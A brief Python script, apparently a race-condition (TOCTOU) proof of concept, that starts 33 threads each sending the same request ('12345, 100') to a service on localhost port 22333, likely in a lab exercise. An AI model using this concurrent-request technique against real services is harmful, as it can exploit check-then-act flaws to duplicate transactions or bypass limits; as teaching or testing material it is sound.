import socket
import threading


def spam():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 22333))
    message = b'12345, 100'
    s.sendall(message)


print('Launching TOCTOU...')
for i in range(33):
    threading.Thread(target=spam).start()